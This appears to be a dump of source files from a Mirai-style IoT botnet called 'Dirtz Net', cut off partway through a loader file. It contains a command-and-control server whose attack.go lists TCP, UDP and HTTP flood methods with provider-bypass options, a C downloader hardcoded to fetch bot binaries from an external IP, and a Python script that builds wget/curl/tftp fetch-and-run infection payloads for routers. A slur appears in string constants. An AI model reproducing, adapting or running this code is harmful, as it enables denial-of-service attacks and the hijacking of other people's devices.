▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄`,
  '/home/ubuntu/extracted_tools/Dirtz Net/cnc/bot.go': `package main

import (
    "net"
    "time"
)

type Bot struct {
    uid     int
    conn    net.Conn
    version byte
    source  string
}

func NewBot(conn net.Conn, version byte, source string) *Bot {
    return &Bot{-1, conn, version, source}
}

func (this *Bot) Handle() {
    clientList.AddClient(this)
    defer clientList.DelClient(this)

    buf := make([]byte, 2)
    for {
        this.conn.SetDeadline(time.Now().Add(180 * time.Second))
        if n,err := this.conn.Read(buf); err != nil || n != len(buf) {
            return
        }
        if n,err := this.conn.Write(buf); err != nil || n != len(buf) {
            return
        }
    }
}

func (this *Bot) QueueBuf(buf []byte) {
    this.conn.Write(buf)
}
`,
  '/home/ubuntu/extracted_tools/Dirtz Net/cnc/admin.go': `package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "net/http"
    "io/ioutil"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
	
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[38;5;196mUsername\x1b[0;37m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[38;5;196mPassword\x1b[0;37m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{\'-\\, \'\\\', \'|\', \'/'\}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\x1b[0;37mAuthing you into the \x1b[38;5;196mDirty Side ;) \x1b[0;37m... \x1b[38;5;196m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }
	this.conn.Write([]byte("\r\n"))	


    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\x1b[0;37mIncorrect credentials\r\n"))
        this.conn.Write([]byte("\r\x1b[0;37mPress any key to exit\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
	
	this.conn.Write([]byte("\r\n"))	
	this.conn.Write([]byte("\r\x1b[0;37m\r\n"))
	this.conn.Write([]byte("\r\n\033[0m"))
    this.conn.Write([]byte("\r\x1b[38;5;196m    	 +---+        ▓█████▄  ██▓ ██▀███  ▄▄▄█████▓▒███████▒        +---+\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m         |---|        ▒██▀ ██▌▓██▒▓██ ▒ ██▒▓  ██▒ ▓▒▒ ▒ ▒ ▄▀░        |---|\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m         |---|        ░██   █▌▒██▒▓██ ░▄█ ▒▒ ▓██░ ▒░░ ▒ ▄▀▒░         |---|\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m     .---^ - ^---.    ░▓█▄   ▌░██░▒██▀▀█▄  ░ ▓██▓ ░   ▄▀▒   ░    .---^ - ^---.\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m     :___________:    ░▒████▓ ░██░░██▓ ▒██▒  ▒██▒ ░ ▒███████▒    :___________:\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m        |  |//|        ▒▒▓  ▒ ░▓  ░ ▒▓ ░▒▓░  ▒ ░░   ░▒▒ ▓░▒░▒       |  |//|\r\n")) 
    this.conn.Write([]byte("\r\x1b[38;5;196m        |  |//|        ░ ▒  ▒  ▒ ░  ░▒ ░ ▒░    ░    ░░▒ ▒ ░ ▒       |  |//|\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m        |  |//|        ░ ░  ░  ▒ ░  ░░   ░   ░      ░ ░ ░ ░ ░       |  |//|\r\n
`,
  '/home/ubuntu/extracted_tools/Dirtz Net/cnc/attack.go': `package main

import (
    "fmt"
    "strings"
    "strconv"
    "net"
    "encoding/binary"
    "errors"
    "github.com/mattn/go-shellwords"
)

type AttackInfo struct {
    attackID            uint8
    attackFlags         []uint8
    attackDescription   string
}

type Attack struct {
    Duration    uint32
    Type        uint8
    Targets     map[uint32]uint8    // Prefix/netmask
    Flags       map[uint8]string    // key=value
}

type FlagInfo struct {
    flagID          uint8
    flagDescription string
}

var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo {
    "len": FlagInfo {
        0,
        "Size of packet data, default is 512 bytes",
    },
    "rand": FlagInfo {
        1,
        "Randomize packet data content, default is 1 (yes)",
    },
    "tos": FlagInfo {
        2,
        "TOS field value in IP header, default is 0",
    },
    "ident": FlagInfo {
        3,
        "ID field value in IP header, default is random",
    },
    "ttl": FlagInfo {
        4,
        "TTL field in IP header, default is 255",
    },
    "df": FlagInfo {
        5,
        "Set the Dont-Fragment bit in IP header, default is 0 (no)",
    },
    "sport": FlagInfo {
        6,
        "Source port, default is random",
    },
    "dport": FlagInfo {
        7,
        "Destination port, default is random",
    },
    "domain": FlagInfo {
        8,
        "Domain name to attack",
    },
    "dhid": FlagInfo {
        9,
        "Domain name transaction ID, default is random",
    },
    "urg": FlagInfo {
        11,
        "Set the URG bit in IP header, default is 0 (no)",
    },
    "ack": FlagInfo {
        12,
        "Set the ACK bit in IP header, default is 0 (no) except for ACK flood",
    },
    "psh": FlagInfo {
        13,
        "Set the PSH bit in IP header, default is 0 (no)",
    },
    "rst": FlagInfo {
        14,
        "Set the RST bit in IP header, default is 0 (no)",
    },
    "syn": FlagInfo {
        15,
        "Set the ACK bit in IP header, default is 0 (no) except for SYN flood",
    },
    "fin": FlagInfo {
        16,
        "Set the FIN bit in IP header, default is 0 (no)",
    },
    "seqnum": FlagInfo {
        17,
        "Sequence number value in TCP header, default is random",
    },
    "acknum": FlagInfo {
        18,
        "Ack number value in TCP header, default is random",
    },
    "gcip": FlagInfo {
        19,
        "Set internal IP to destination ip, default is 0 (no)",
    },
    "method": FlagInfo {
        20,
        "HTTP method name, default is get",
    },
    "postdata": FlagInfo {
        21,
        "POST data, default is empty/none",
    },
    "path": FlagInfo {
        22,
        "HTTP path, default is /",
    },
    "conns": FlagInfo {
        24,
        "Number of threads",
    },
    "source": FlagInfo {
        25,
        "Source IP address, 255.255.255.255 for random",
    },
    "host": FlagInfo {
        26,
        "Domain/ip to flood",
    },
    "time": FlagInfo {
        27,
        "Time to flood the ip for",
    },
    "threads": FlagInfo {
        28,
        "Amount of threads to run on",
    },
    "length": FlagInfo {
        29,
        "Time of attack 1 = short 3 = long",
    },
}
var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
    ".tcp": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "tcp flood (syn, ack, rst, psh, urg)",
    },
    ".udp": AttackInfo {
        2,
        []uint8 {0, 1, 7},
        "raw udp flood",
    },
    ".std": AttackInfo {
        3,
        []uint8 {0, 1, 7},
        "std udp flood",
    },
    ".vse": AttackInfo {
        4,
        []uint8 {0, 1, 7},
        "valve flood (games)",
    },
    ".http": AttackInfo {
        5,
        []uint8 {8, 7, 20, 21, 22, 24},
        "l7 http flood",
    },
	".ovh": AttackInfo {
        6,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "ovh bypass flood",
    },
	".httpcf": AttackInfo {
        7,
        []uint8 { 8, 7, 20, 21, 22, 24 },
        "HTTP CLOUDFLARE BYPASS flood",
    },
	".lynx": AttackInfo {
        8,
        []uint8 { 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 },
        "lynx flood (tcp)",
    },
	".xmas": AttackInfo {
        9,
        []uint8 { 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 },
        "xmas flood (tcp)",
    },
    ".asyn": AttackInfo {
        10,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "asyn flood",
    },
    ".frag": AttackInfo {
        11,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "tcpfrag flood",
    },
    ".tcpall": AttackInfo {
        12,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "tcpall flood",
    },
    ".syn": AttackInfo {
        13,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "syn flood",
    },
    ".ack": AttackInfo {
        14,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "ack flood",
    },
    ".usyn": AttackInfo {
        15,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "usyn flood",
    },
}
func uint8InSlice(a uint8, list []uint8) bool {
    for _, b := range list {
        if b == a {
            return true
        }
    }
    return false
}

func NewAttack(str string, admin int) (*Attack, error) {
    atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
    args, _ := shellwords.Parse(str)

    var atkInfo AttackInfo
    // Parse attack name
    if len(args) == 0 {
        return nil, errors.New("Must specify an attack name")
    } else {
        if args[0] == ".method" {
            validCmdList := "\033[0;37m[\033[0;35mDIRTZ\033[0;37m] Methods\r\n\033[0;37m"
            for cmdName, atkInfo := range attackInfoLookup {
                validCmdList += cmdName + ": " + atkInfo.attackDescription + "\r\n"
            }
            return nil, errors.New(validCmdList)
        }
        var exists bool
        atkInfo, exists = attackInfoLookup[args[0]]
        if !exists {
            return nil, errors.New(fmt.Sprintf("\033[0;35mThis isnt a [\033[0;35m\033[0;35mDIRTZ] Method: \033[0;35m%s.", args[0]))
        }
        atk.Type = atkInfo.attackID
        args = args[1:]
    }

    // Parse targets
    if len(args) == 0 {
        return nil, errors.New("Must specify prefix/netmask as targets")
    } else {
        if args[0] == ".method" {
            return nil, errors.New("\033[37;35mComma delimited list of target prefixes\r\nEx: 192.168.0.1\r\nEx: 10.0.0.0/8\r\nEx: 8.8.8.8,127.0.0.0/29")
        }
        cidrArgs := strings.Split(args[0], ",")
        if len(cidrArgs) > 255 {
            return nil, errors.New("Cannot specify more than 255 targets in a single attack!")
        }
        for _,cidr := range cidrArgs {
            prefix := ""
            netmask := uint8(32)
            cidrInfo := strings.Split(cidr, "/")
            if len(cidrInfo) == 0 {
                return nil, errors.New("Blank target specified!")
            }
            prefix = cidrInfo[0]
            if len(cidrInfo) == 2 {
                netmaskTmp, err := strconv.Atoi(cidrInfo[1])
                if err != nil || netmask > 32 || netmask < 0 {
                    return nil, errors.New(fmt.Sprintf("Invalid netmask was supplied, near %s", cidr))
                }
                netmask = uint8(netmaskTmp)
            } else if len(cidrInfo) > 2 {
                return nil, errors.New(fmt.Sprintf("Too many /\'s in prefix, near %s", cidr))
            }

            ip := net.ParseIP(prefix)
            if ip == nil {
                return nil, errors.New(fmt.Sprintf("Failed to parse IP address, near %s", cidr))
            }
            atk.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
        }
        args = args[1:]
    }

    // Parse attack duration time
    if len(args) == 0 {
        return nil, errors.New("Must specify an attack duration")
    } else {
        if args[0] == ".method" {
            return nil, errors.New("\033[37;35mDuration of the attack, in seconds")
        }
        duration, err := strconv.Atoi(args[0])
        if err != nil || duration == 0 || duration > 86400 {
            return nil, errors.New(fmt.Sprintf("Invalid attack duration, near %s. Duration must be between 0 and 86400 seconds", args[0]))
        }
        atk.Duration = uint32(duration)
        args = args[1:]
    }

    // Parse flags
    for len(args) > 0 {
        if args[0] == ".method" {
            validFlags := "\033[37;35mList of flags key=val seperated by spaces. Valid flags for this method are\r\n\r\n"
            for _, flagID := range atkInfo.attackFlags {
                for flagName, flagInfo := range flagInfoLookup {
                    if flagID == flagInfo.flagID {
                        validFlags += flagName + ": " + flagInfo.flagDescription + "\r\n"
                        break
                    }
                }
            }
            validFlags += "\r\nValue of 65533 for a flag denotes random (for ports, etc)\r\n"
            validFlags += "Ex: seq=0\r\nEx: sport=0 dport=65533"
            return nil, errors.New(validFlags)
        }
        flagSplit := strings.SplitN(args[0], "=", 2)
        if len(flagSplit) != 2 {
            return nil, errors.New(fmt.Sprintf("Invalid key=value flag combination near %s", args[0]))
        }
        flagInfo, exists := flagInfoLookup[flagSplit[0]]
        if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) || (admin == 0 && flagInfo.flagID == 25) {
            return nil, errors.New(fmt.Sprintf("Invalid flag key %s, near %s", flagSplit[0], args[0]))
        }
        if flagSplit[1][0] == '\'' {
            flagSplit[1] = flagSplit[1][1:len(flagSplit[1]) - 1]
            fmt.Println(flagSplit[1])
        }
        if flagSplit[1] == "true" {
            flagSplit[1] = "1"
        } else if flagSplit[1] == "false" {
            flagSplit[1] = "0"
        }
        atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]
        args = args[1:]
    }
    if len(atk.Flags) > 255 {
        return nil, errors.New("Cannot have more than 255 flags")
    }

    return atk, nil
}

func (this *Attack) Build() ([]byte, error) {
    buf := make([]byte, 0)
    var tmp []byte

    // Add in attack duration
    tmp = make([]byte, 4)
    binary.BigEndian.PutUint32(tmp, this.Duration)
    buf = append(buf, tmp...)

    // Add in attack type
    buf = append(buf, byte(this.Type))

    // Send number of targets
    buf = append(buf, byte(len(this.Targets)))

    // Send targets
    for prefix,netmask := range this.Targets {
        tmp = make([]byte, 5)
        binary.BigEndian.PutUint32(tmp, prefix)
        tmp[4] = byte(netmask)
        buf = append(buf, tmp...)
    }

    // Send number of flags
    buf = append(buf, byte(len(this.Flags)))

    // Send flags
    for key,val := range this.Flags {
        tmp = make([]byte, 2)
        tmp[0] = key
        strbuf := []byte(val)
        if len(strbuf) > 255 {
            return nil, errors.New("Flag value cannot be more than 255 bytes!")
        }
        tmp[1] = uint8(len(strbuf))
        tmp = append(tmp, strbuf...)
        buf = append(buf, tmp...)
    }

    // Specify the total length
    if len(buf) > 4096 {
        return nil, errors.New("Max buffer is 4096")
    }
    tmp = make([]byte, 2)
    binary.BigEndian.PutUint16(tmp, uint16(len(buf) + 2))
    buf = append(tmp, buf...)

    return buf, nil
}
`))
`,
  '/home/ubuntu/extracted_tools/Dirtz Net/cnc/clientList.go': `package main

import (
    "time"
    "math/rand"
    "sync"
)

type AttackSend struct {
    buf         []byte
    count       int
    botCata     string
}

type ClientList struct {
    uid         int
    count       int
    clients     map[int]*Bot
    addQueue    chan *Bot
    delQueue    chan *Bot
    atkQueue    chan *AttackSend
    totalCount  chan int
    cntView     chan int
    distViewReq chan int
    distViewRes chan map[string]int
    cntMutex    *sync.Mutex
}

func NewClientList() *ClientList {
    c := &ClientList{0, 0, make(map[int]*Bot), make(chan *Bot, 128), make(chan *Bot, 128), make(chan *AttackSend), make(chan int, 64), make(chan int), make(chan int), make(chan map[string]int), &sync.Mutex{}}
    go c.worker()
    go c.fastCountWorker()
    return c
}

func (this *ClientList) Count() int {
    this.cntMutex.Lock()
    defer this.cntMutex.Unlock()

    this.cntView <- 0
    return <-this.cntView
}

func (this *ClientList) Distribution() map[string]int {
    this.cntMutex.Lock()
    defer this.cntMutex.Unlock()
    this.distViewReq <- 0
    return <-this.distViewRes
}

func (this *ClientList) AddClient(c *Bot) {
    this.addQueue <- c
}

func (this *ClientList) DelClient(c *Bot) {
    this.delQueue <- c
}

func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
    attack := &AttackSend{buf, maxbots, botCata}
    this.atkQueue <- attack
}

func (this *ClientList) fastCountWorker() {
    for {
        select {
        case delta := <-this.totalCount:
            this.count += delta
            break
        case <-this.cntView:
            this.cntView <- this.count
            break
        }
    }
}

func (this *ClientList) worker() {
    rand.Seed(time.Now().UTC().UnixNano())

    for {
        select {
        case add := <-this.addQueue:
            this.totalCount <- 1
            this.uid++
            add.uid = this.uid
            this.clients[add.uid] = add
            break
        case del := <-this.delQueue:
            this.totalCount <- -1
            delete(this.clients, del.uid)
            break
        case atk := <-this.atkQueue:
            if atk.count == -1 {
                for _,v := range this.clients {
                    if atk.botCata == "" || atk.botCata == v.source {
                        v.QueueBuf(atk.buf)
                    }
                }
            } else {
                var count int
                for _, v := range this.clients {
                    if count > atk.count {
                        break
                    }
                    if atk.botCata == "" || atk.botCata == v.source {
                        v.QueueBuf(atk.buf)
                        count++
                    }
                }
            }
            break
        case <-this.cntView:
            this.cntView <- this.count
            break
        case <-this.distViewReq:
            res := make(map[string]int)
            for _,v := range this.clients {
                if ok,_ := res[v.source]; ok > 0 {
                    res[v.source]++
                } else {
                    res[v.source] = 1
                }
            }
            this.distViewRes <- res
        }
    }
}
`))
`,
  '/home/ubuntu/extracted_tools/Dirtz Net/dlr/main.c': `#include <sys/types.h>
//#include <bits/syscalls.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define HTTP_SERVER utils_inet_addr(185,244,25,35) // CHANGE TO YOUR HTTP SERVER IP

#define EXEC_MSG            "NIGGY\n"
#define EXEC_MSG_LEN        6

#define DOWNLOAD_MSG        "RAY\n"
#define DOWNLOAD_MSG_LEN    4

#define STDIN   0
#define STDOUT  1
#define STDERR  2

#if BYTE_ORDER == BIG_ENDIAN
#define HTONS(n) (n)
#define HTONL(n) (n)
#elif BYTE_ORDER == LITTLE_ENDIAN
#define HTONS(n) (((((unsigned short)(n) & 0xff)) << 8) | (((unsigned short)(n) & 0xff00) >> 8))
#define HTONL(n) (((((unsigned long)(n) & 0xff)) << 24) | \
                  ((((unsigned long)(n) & 0xff00)) << 8) | \
                  ((((unsigned long)(n) & 0xff0000)) >> 8) | \
                  ((((unsigned long)(n) & 0xff000000)) >> 24))
#else
#error "Fix byteorder"
#endif

#ifdef __ARM_EABI__
#define SCN(n) ((n) & 0xfffff)
#else
#define SCN(n) (n)
#endif

inline void run(void);
int sstrlen(char *);
unsigned int utils_inet_addr(unsigned char, unsigned char, unsigned char, unsigned char);

/* stdlib calls */
int xsocket(int, int, int);
int xwrite(int, void *, int);
int xread(int, void *, int);
int xconnect(int, struct sockaddr_in *, int);
int xopen(char *, int, int);
int xclose(int);
void x__exit(int);

#define socket xsocket
#define write xwrite
#define read xread
#define connect xconnect
#define open xopen
#define close xclose
#define __exit x__exit

void __start(void)
{ 
#if defined(MIPS) || defined(MIPSEL)
    __asm(
        ".set noreorder\n"
        "move $0, $31\n"
        "bal 10f\n"
        "nop\n"
        "10:\n.cpload $31\n"
        "move $31, $0\n"
        ".set reorder\n"
    );
#endif
    run();
}

inline void run(void)
{
    char recvbuf[128];
    struct sockaddr_in addr;
    int sfd, ffd, ret;
    unsigned int header_parser = 0;
    int arch_strlen = sstrlen(BOT_ARCH);

    write(STDOUT, EXEC_MSG, EXEC_MSG_LEN);

    addr.sin_family = AF_INET;
    addr.sin_port = HTONS(80);
    addr.sin_addr.s_addr = HTTP_SERVER;

    ffd = open("NiGGeR69xd", O_WRONLY | O_CREAT | O_TRUNC, 0777);

    sfd = socket(AF_INET, SOCK_STREAM, 0);

#ifdef DEBUG
    if (ffd == -1)
        printf("Failed to open file!\n");
    if (sfd == -1)
        printf("Failed to call socket()\n");
#endif

    if (sfd == -1 || ffd == -1)
        __exit(1);

#ifdef DEBUG
    printf("Connecting to host...\n");
#endif

    if ((ret = connect(sfd, &addr, sizeof (struct sockaddr_in))) < 0)
    {
#ifdef DEBUG
        printf("Failed to connect to host.\n");
#endif
        write(STDOUT, "YAR\n", 4);
        __exit(-ret);
    }

#ifdef DEBUG
    printf("Connected to host\n");
#endif

    if (write(sfd, "GET /bins/sora." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
    {
#ifdef DEBUG
        printf("Failed to send get request.\n");
#endif

        __exit(3);
    }

#ifdef DEBUG
    printf("Started header parse...\n");
#endif

    while (header_parser != 0x0d0a0d0a)
    {
        char ch;
        int ret = read(sfd, &ch, 1);

        if (ret != 1)
            __exit(4);
        header_parser = (header_parser << 8) | ch;
    }

#ifdef DEBUG
    printf("Finished receiving HTTP header\n");
#endif

    while (1)
    {
        int ret = read(sfd, recvbuf, sizeof (recvbuf));

        if (ret <= 0)
            break;
        write(ffd, recvbuf, ret);
    }

    close(sfd);
    close(ffd);
    write(STDOUT, DOWNLOAD_MSG, DOWNLOAD_MSG_LEN);
    __exit(5);
}

int sstrlen(char *str)
{
    int c = 0;

    while (*str++ != 0)
        c++;
    return c;
}

unsigned int utils_inet_addr(unsigned char one, unsigned char two, unsigned char three, unsigned char four)
{
    unsigned long ip = 0;

    ip |= (one << 24);
    ip |= (two << 16);
    ip |= (three << 8);
    ip |= (four << 0);
    return HTONL(ip);
}

int xsocket(int domain, int type, int protocol)
{
#if defined(__NR_socketcall)
#ifdef DEBUG
    printf("socket using socketcall\n");
#endif
    struct {
        int domain, type, protocol;
    } socketcall;
    socketcall.domain = domain;
    socketcall.type = type;
    socketcall.protocol = protocol;

    // 1 == SYS_SOCKET
    int ret = syscall(SCN(SYS_socketcall), 1, &socketcall);

#ifdef DEBUG
    printf("socket got ret: %d\n", ret);
#endif
     return ret;
#else
#ifdef DEBUG
    printf("socket using socket\n");
#endif
    return syscall(SCN(SYS_socket), domain, type, protocol);
#endif
}

int xread(int fd, void *buf, int len)
{
    return syscall(SCN(SYS_read), fd, buf, len);
}

int xwrite(int fd, void *buf, int len)
{
    return syscall(SCN(SYS_write), fd, buf, len);
}

int xconnect(int fd, struct sockaddr_in *addr, int len)
{
#if defined(__NR_socketcall)
#ifdef DEBUG
    printf("connect using socketcall\n");
#endif
    struct {
        int fd;
        struct sockaddr_in *addr;
        int len;
    } socketcall;
    socketcall.fd = fd;
    socketcall.addr = addr;
    socketcall.len = len;
    // 3 == SYS_CONNECT
    int ret = syscall(SCN(SYS_socketcall), 3, &socketcall);

#ifdef DEBUG
    printf("connect got ret: %d\n", ret);
#endif

    return ret;
#else
#ifdef DEBUG
    printf("connect using connect\n");
#endif
    return syscall(SCN(SYS_connect), fd, addr, len);
#endif
}

int xopen(char *path, int flags, int other)
{
    return syscall(SCN(SYS_open), path, flags, other);
}

int xclose(int fd)
{
    return syscall(SCN(SYS_close), fd);
}

void x__exit(int code)
{
    syscall(SCN(SYS_exit), code);
}
`))
`,
  '/home/ubuntu/extracted_tools/Dirtz Net/netcore.py': `import subprocess, sys, urllib, time
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "Hybrid"
exec_name = "exploit.netcore.mips"
bin_prefix = ""
bin_directory = "bins"
archs = ["sora.x86",               #1
"sora.mips",                       #2
"sora.mpsl",                       #3
"sora.arm4",                       #4
"sora.arm5",                       #5
"sora.arm6",                       #6
"sora.arm7",                       #7
"sora.ppc",                        #8
"sora.m68k",                       #9
"sora.sh4"]                        #10
def run(cmd):
    subprocess.call(cmd, shell=True)
print("\x1b[0;37m[CC] INSTALLING WEB SERVER DEPENDENCIES")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("\x1b[0;37m[CC] CREATING .SH BINS")
time.sleep(3)
run('echo "#!/bin/bash" > /var/lib/tftpboot/t8UsA.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/t8UsA.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/t8UsA.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/t8UsA2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/t8UsA2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/t8UsA2.sh')
run('echo "#!/bin/bash" > /var/www/html/8UsA.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/t8UsA2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/t8UsA2.sh')
run('echo "#!/bin/bash" > /var/ftp/8UsA1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/8UsA1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/8UsA1.sh')
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/www/html/8UsA.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/ftp/8UsA1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/t8UsA.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/t8UsA2.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
print("\x1b[0;37m[CC] BUILDING NETCORE PAYLOAD")
time.sleep(3)
print("\x1b[0;37m[CC] FINISHED SETTING UP NETCORE PAYLOAD")
complete_payload = ("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/8UsA.sh; curl -O http://" + ip + "/8UsA.sh; chmod 777 8UsA.sh; sh 8UsA.sh; tftp " + ip + " -c get t8UsA.sh; chmod 777 t8UsA.sh; sh t8UsA.sh; tftp -r t8UsA2.sh -g " + ip + "; chmod 777 t8UsA2.sh; sh t8UsA2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " 8UsA1.sh 8UsA1.sh; sh 8UsA1.sh; rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh 8UsA1.sh; rm -rf *")
f = open("Netcore.txt","w+")
f.write(complete_payload)
f.close()
print("\x1b[0;37m[CC] NETCORE PAYLOAD OUTPUTTED TO: NETCORE.TXT")
time.sleep(3)
run("ulimit -u99999; ulimit -n99999")
run("screen ./cnc")
run("clear")
run("rm -rf ~/netcore.py")
exit()
`))
`,
  '/home/ubuntu/extracted_tools/Dirtz Net/loader/src/main.c': `#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <pthread.h>

#include "server.h"
#include "telnet_info.h"
#include "binary.h"
#include "util.h"
#include "config.h"

static struct server *srv;

static void *stats_thread(void *arg)
{
    uint32_t last_reports_sent = 0;
    uint32_t last_logins = 0;
    uint32_t last_successes = 0;
    uint32_t last_echoes = 0;
    uint32_t last_wgets = 0;
    uint32_t last_tftps = 0;
    uint32_t last_total_logins = 0;
    uint32_t last_total_successes = 0;
    uint32_t last_total_echoes = 0;
    uint32_t last_total_wgets = 0;
    uint32_t last_total_tftps = 0;

    while (TRUE)
    {
        printf("\033[0;37mTime: %ds | Conns: %d | Logins: %d (%d/s) | Successes: %d (%d/s) | Echoes: %d (%d/s) | Wgets: %d (%d/s) | Tftps: %d (%d/s)\033[0m\n",
               (uint32_t)time(NULL) - srv->started,
               srv->curr_open_conns,
               srv->total_logins,
               srv->total_logins - last_total_logins,
               srv->total_successes,
               srv->total_successes - last_total_successes,
               srv->total_echoes,
               srv->total_echoes - last_total_echoes,
               srv->total_wgets,
               srv->total_wgets - last_total_wgets,
               srv->total_tftps,
               srv->total_tftps - last_total_tftps);
        last_total_logins = srv->total_logins;
        last_total_successes = srv->total_successes;
        last_total_echoes = srv->total_echoes;
